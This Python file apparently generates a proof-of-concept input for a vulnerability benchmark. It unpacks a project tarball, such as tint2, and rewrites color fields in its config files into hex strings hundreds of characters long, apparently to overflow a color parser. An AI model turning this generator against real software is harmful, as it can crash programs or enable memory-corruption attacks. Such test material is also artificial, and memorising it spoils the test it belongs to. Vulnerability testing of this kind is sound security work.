import os
import re
import tarfile
import tempfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        def safe_extract(tar: tarfile.TarFile, path: str):
            base = os.path.abspath(path)
            for member in tar.getmembers():
                member_path = os.path.abspath(os.path.join(path, member.name))
                if not member_path.startswith(base):
                    continue
                try:
                    tar.extract(member, path)
                except Exception:
                    pass

        def list_all_files(root: str):
            for dirpath, dirnames, filenames in os.walk(root):
                # Skip some heavy or irrelevant dirs
                lower = os.path.basename(dirpath).lower()
                if lower in {"build", "dist", "out", "bin", "obj", "third_party", "vendor"}:
                    continue
                for fn in filenames:
                    yield os.path.join(dirpath, fn)

        def probably_text(path: str) -> bool:
            try:
                with open(path, 'rb') as f:
                    data = f.read(4096)
                if b'\x00' in data:
                    return False
                # Heuristic: ratio of non-printable
                # Allow tabs/newlines/carriage returns
                printable = set(range(32, 127)) | {9, 10, 13}
                if not data:
                    return True
                bad = sum(1 for b in data if b not in printable)
                return bad / max(1, len(data)) < 0.3
            except Exception:
                return False

        def read_text(path: str) -> str:
            try:
                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    return f.read()
            except Exception:
                try:
                    with open(path, 'r', encoding='latin-1', errors='ignore') as f:
                        return f.read()
                except Exception:
                    return ""

        # Scoring of candidate config files
        def score_config_content(content: str) -> int:
            score = 0
            for raw_line in content.splitlines():
                line = raw_line.strip()
                if not line:
                    continue
                # comments in many formats
                if line.startswith('#') or line.startswith('//') or line.startswith(';'):
                    continue
                low = line.lower()
                color_boost = 2 if ('color' in low or 'colour' in low) else 0
                # 0x pattern
                if re.search(r'0x[0-9a-fA-F]{3,}', line):
                    score += 2 + color_boost
                # #hex pattern (avoid lines that are all comment)
                if re.search(r'#[0-9a-fA-F]{3,}', line):
                    score += 2 + color_boost
                # assignment of plain hex
                if re.search(r'=\s*["\']?[0-9a-fA-F]{3,}["\']?', line) and color_boost:
                    score += 3
                # JSON-like color fields
                if re.search(r'["\']color["\']\s*:\s*["\']#?[0-9a-fA-F]{3,}["\']', low):
                    score += 4
            return score

        def find_candidate_configs(root: str):
            candidates = []
            # Prioritize typical config extensions and example/sample dirs
            exts = {'.conf', '.cfg', '.ini', '.rc', '.toml', '.yaml', '.yml', '.json', '.txt'}
            for path in list_all_files(root):
                name = os.path.basename(path).lower()
                if not probably_text(path):
                    continue
                good_ext = any(name.endswith(ext) for ext in exts) or 'config' in name or 'conf' in name or name in {'tint2rc', 'dunstrc'}
                if not good_ext:
                    continue
                content = read_text(path)
                if not content:
                    continue
                score = score_config_content(content)
                if score > 0:
                    # Prefer files likely to be examples/samples
                    bonus = 0
                    dn = os.path.dirname(path).lower()
                    if any(tok in dn for tok in ('example', 'examples', 'sample', 'samples', 'doc', 'docs', 'man', 'test', 'tests', 'config')):
                        bonus += 2
                    # prefer smaller files
                    try:
                        sz = os.path.getsize(path)
                    except Exception:
                        sz = 0
                    size_penalty = 0
                    if sz > 64 * 1024:
                        size_penalty = 1
                    candidates.append((score + bonus - size_penalty, path, content))
            candidates.sort(key=lambda x: (-x[0], len(x[2])))
            return candidates

        def mutate_line(line: str, hex_len: int) -> (str, int):
            # do not touch comment lines
            stripped = line.lstrip()
            if stripped.startswith('#') or stripped.startswith('//') or stripped.startswith(';'):
                return line, 0

            mutated = 0
            original_line = line

            # JSON-like "color": "#..."
            def repl_json_color(m):
                nonlocal mutated
                mutated += 1
                quote = m.group(1)
                prefix = m.group(2) or ''
                return f'{quote}{prefix}{"F"*hex_len}{quote}'

            # Replace JSON color values
            pattern_json = re.compile(r'(["\'])#?([0-9a-fA-F]{3,})\1')
            if 'color' in stripped.lower():
                line, n = pattern_json.subn(repl_json_color, line, count=1)
                if n > 0:
                    return line, mutated

            # 0xHEX
            idx = line.find('0x')
            if idx != -1:
                # ensure not part of comment-like token
                pre = line[:idx]
                if not pre.strip().startswith(('#', '//', ';')):
                    # expand hex digits following
                    j = idx + 2
                    while j < len(line) and re.match(r'[0-9a-fA-F]', line[j]):
                        j += 1
                    line = line[:idx + 2] + ('F' * hex_len) + line[j:]
                    mutated += 1
                    return line, mutated

            # #HEX not at line start
            hash_positions = [m.start() for m in re.finditer(r'#', line)]
            for hp in hash_positions:
                if hp == line.lstrip().find('#'):
                    # if this is the first non-space char, it's probably a comment
                    if line[:hp].strip() == '':
                        continue
                # expand following hex digits
                j = hp + 1
                if j < len(line) and re.match(r'[0-9a-fA-F]', line[j]):
                    while j < len(line) and re.match(r'[0-9a-fA-F]', line[j]):
                        j += 1
                    line = line[:hp + 1] + ('F' * hex_len) + line[j:]
                    mutated += 1
                    return line, mutated

            # assignment with hex value: key = AABBCC
            if '=' in line and ('color' in line.lower() or 'colour' in line.lower()):
                before, after = line.split('=', 1)
                aft = after.strip()
                m = re.match(r'["\']?#?[0-9a-fA-F]{3,}["\']?', aft)
                if m:
                    start = after.find(m.group(0))
                    if start != -1:
                        prefix = ''
                        # Keep prefix '#' if present
                        if m.group(0).startswith('#'):
                            prefix = '#'
                        # Keep quotes if present
                        q1 = m.group(0).startswith('"') or m.group(0).startswith("'")
                        q2 = m.group(0).endswith('"') or m.group(0).endswith("'")
                        new_val = prefix + ('F' * hex_len)
                        if q1 and q2:
                            new_val = '"' + new_val + '"'
                        line = before + '=' + after[:start] + new_val + after[start + len(m.group(0)):]
                        mutated += 1
                        return line, mutated

            # As a last resort, if line contains 'color' word, append a huge hex
            if 'color' in line.lower():
                # Try to keep format 'key = #HEX'
                if '=' in line:
                    parts = line.split('=', 1)
                    line = parts[0] + '= #' + ('F' * hex_len) + '\n'
                else:
                    line = line.rstrip('\n') + ' #' + ('F' * hex_len) + '\n'
                mutated += 1
                return line, mutated

            return original_line, mutated

        def mutate_config(content: str, hex_len: int = 768) -> (str, int):
            lines = content.splitlines(keepends=True)
            mutated_count = 0
            new_lines = []
            for ln in lines:
                new_ln, changed = mutate_line(ln, hex_len)
                new_lines.append(new_ln)
                mutated_count += changed
            return ''.join(new_lines), mutated_count

        # Extract tarball
        tmpdir = tempfile.mkdtemp(prefix="pocgen_")
        try:
            with tarfile.open(src_path) as tf:
                safe_extract(tf, tmpdir)
        except Exception:
            # If cannot extract, return generic fallback PoC
            generic = (
                "color = #{}\n"
                "bg_color = 0x{}\n"
                "foreground: #{};\n"
                '"color": "#{}"\n'
            ).format('F' * 800, 'F' * 800, 'F' * 800, 'F' * 800)
            return generic.encode('utf-8', errors='ignore')

        # Try to detect specific known projects to tailor config formats
        project_hint = ""
        try:
            # Look at top-level directory names
            roots = []
            for p in os.listdir(tmpdir):
                roots.append(p.lower())
            if any('tint2' in r for r in roots):
                project_hint = "tint2"
            else:
                # Try reading CMakeLists or configure.ac for hints
                cm_paths = []
                for f in list_all_files(tmpdir):
                    bn = os.path.basename(f).lower()
                    if bn in ('cmakelists.txt', 'configure.ac', 'configure.in', 'meson.build', 'meson_options.txt'):
                        cm_paths.append(f)
                for f in cm_paths:
                    data = read_text(f).lower()
                    if 'tint2' in data:
                        project_hint = "tint2"
                        break
        except Exception:
            pass

        candidates = find_candidate_configs(tmpdir)

        # If tint2 detected and no candidates, craft a minimal tint2-like config
        if project_hint == "tint2" and not candidates:
            hexlen = 800
            poc = []
            # Tint2 config lines often have color with optional opacity percent
            poc.append("background_color = #{} 100\n".format('F' * hexlen))
            poc.append("panel_items = TSC\n")
            poc.append("time1_format = %H:%M\n")
            poc.append("time1_font = Sans 10\n")
            poc.append("task_active_background_color = #{} 100\n".format('E' * hexlen))
            poc.append("task_background_color = #{} 70\n".format('D' * hexlen))
            poc.append("battery_font_color = #{} 100\n".format('C' * hexlen))
            return ''.join(poc).encode('utf-8', errors='ignore')

        # If we found candidate config files, pick the best and mutate it
        if candidates:
            # Try multiple hex lengths if necessary to achieve mutation
            base_score, path, content = candidates[0]
            for hex_len in (768, 1024, 1536, 512):
                mutated, count = mutate_config(content, hex_len=hex_len)
                if count > 0:
                    return mutated.encode('utf-8', errors='ignore')

        # Fallback: try to infer keys from source files
        def infer_color_keys(root: str):
            keys = set()
            for path in list_all_files(root):
                bn = os.path.basename(path).lower()
                if not probably_text(path):
                    continue
                if not (bn.endswith('.c') or bn.endswith('.h') or bn.endswith('.cpp') or bn.endswith('.cc') or bn.endswith('.hpp') or bn.endswith('.hh') or bn.endswith('.txt') or 'readme' in bn or 'doc' in bn):
                    continue
                txt = read_text(path)
                if not txt:
                    continue
                # gather string literals containing 'color'
                for m in re.finditer(r'"([A-Za-z0-9_.:\-]+)"', txt):
                    s = m.group(1)
                    if 'color' in s.lower() or 'colour' in s.lower():
                        if len(s) <= 50 and not s.startswith('http'):
                            keys.add(s)
                for m in re.finditer(r"'([A-Za-z0-9_.:\-]+)'", txt):
                    s = m.group(1)
                    if 'color' in s.lower() or 'colour' in s.lower():
                        if len(s) <= 50 and not s.startswith('http'):
                            keys.add(s)
            # Some common fallbacks
            defaults = ['color', 'bg_color', 'foreground_color', 'background_color', 'border_color', 'active_color', 'inactive_color']
            keys.update(defaults)
            return list(keys)[:30]

        keys = infer_color_keys(tmpdir)
        if keys:
            hexstr = 'F' * 900
            lines = []
            # Mix of formats to maximize chance of hitting parser
            for k in keys[:10]:
                lines.append(f'{k} = #{hexstr}\n')
            for k in keys[10:20]:
                lines.append(f'{k} = 0x{hexstr}\n')
            for k in keys[20:]:
                lines.append(f'"{k}": "#{hexstr}"\n')
            return ''.join(lines).encode('utf-8', errors='ignore')

        # Final generic fallback
        generic = (
            "color = #{}\n"
            "bg_color = 0x{}\n"
            "foreground: #{};\n"
            '"color": "#{}"\n'
        ).format('F' * 800, 'F' * 800, 'F' * 800, 'F' * 800)
        return generic.encode('utf-8', errors='ignore')
